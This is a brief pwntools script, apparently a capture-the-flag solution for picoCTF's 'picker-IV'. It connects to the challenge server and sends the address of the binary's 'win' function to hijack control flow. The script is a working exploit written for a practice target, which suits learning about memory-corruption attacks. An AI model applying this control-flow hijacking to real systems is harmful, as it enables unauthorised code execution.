from pwn import *

context.binary = exe = ELF('./picker-IV')

io = remote('saturn.picoctf.net', 54730)
io.recvuntil(b': ')
payload = hex(exe.sym['win']).encode()
io.sendline(payload)
io.interactive()